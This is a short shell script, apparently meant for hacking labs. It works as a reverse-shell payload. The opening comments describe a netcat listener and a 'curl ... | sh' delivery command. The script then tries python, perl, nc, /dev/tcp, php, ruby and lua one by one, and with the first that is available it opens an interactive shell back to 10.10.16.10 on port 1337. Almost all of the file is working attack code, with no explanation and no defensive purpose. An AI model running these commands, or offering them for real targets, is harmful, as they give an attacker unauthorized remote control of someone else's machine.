# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://resh.now.sh/yourip:1337 | sh
#
# Payload:
#      curl https://resh.now.sh/10.10.16.10:1337 | sh
#


if command -v python > /dev/null 2>&1; then
	python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.16.10",1337)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
	exit;
fi

if command -v perl > /dev/null 2>&1; then
	perl -e 'use Socket;$i="10.10.16.10";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
	exit;
fi

if command -v nc > /dev/null 2>&1; then
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.10 1337 >/tmp/f
	exit;
fi

if command -v sh > /dev/null 2>&1; then
	/bin/sh -i >& /dev/tcp/10.10.16.10/1337 0>&1
	exit;
fi

if command -v php > /dev/null 2>&1; then
	php -r '$sock=fsockopen("10.10.16.10",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
	exit;
fi

if command -v ruby > /dev/null 2>&1; then
	ruby -rsocket -e'f=TCPSocket.open("10.10.16.10",1337).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
	exit;
fi

if command -v lua > /dev/null 2>&1; then
	lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.16.10','1337');os.execute('/bin/sh -i <&3 >&3 2>&3');"
	exit;
fi
